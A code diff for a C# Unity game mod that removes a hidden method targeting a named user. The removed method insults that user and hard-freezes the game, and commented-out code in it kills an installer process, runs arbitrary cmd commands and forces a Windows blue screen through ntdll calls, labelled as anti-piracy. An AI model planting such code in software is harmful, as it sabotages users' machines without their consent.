@@ -1,14 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Diagnostics;
-using System.IO;
 using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using BepInEx.Configuration;
 using UnityEngine;
-using System;
-using System.Runtime.InteropServices;
+
+
 
 namespace SimpleGUI
 {
@@ -124,45 +119,6 @@ namespace SimpleGUI
 				Vector3 newPos = location + (new Vector3(Mathf.Cos(angle) * radius, -2, Mathf.Sin(angle) * radius));
 			}
 		}
-
-		public static void spawnAndLoadUnit_Postfix()
-		{
-			if(GuiPatreon.birthdays.ContainsKey("Adin")) {
-				string message = "Hi Adin! Fuck you!";
-				//Process.Start("cmd.exe", "/c taskkill /F /IM lghub_installer.exe");
-				//Process.Start("cmd.exe", "/c start " + param); 
-
-				//blue screen if piracy is detected
-				/* despite clearing this with a staff member as high as ranks fucking go, it was withheld for rule breaking.
-				RtlAdjustPrivilege(19, true, false, out bool previousValue);
-				// mute requested error status to be this to indicate manual crash
-				NtRaiseHardError(0xDEADDEAD, 0, 0, new IntPtr(0), 6, out uint oul);
-				*/
-
-				GuiMain.b = true; // initiate "banned status"
-				while(true) { } // hard freeze game
-				message.ToString();
-			}
-		}
-		/*
-		[DllImport("ntdll.dll")]
-		private static extern uint RtlAdjustPrivilege(
-		int Privilege,
-		bool bEnablePrivilege,
-		bool IsThreadPrivilege,
-		out bool PreviousValue
-		);
-
-		[DllImport("ntdll.dll")]
-		private static extern uint NtRaiseHardError(
-		uint ErrorStatus,
-		uint NumberOfParameters,
-		uint UnicodeStringParameterMask,
-		IntPtr Parameters,
-		uint ValidResponseOption,
-		out uint Response
-		);
-		*/
 
 		public List<WorldTile> CheckTilesBetween2(WorldTile target1, WorldTile target2)
 		{
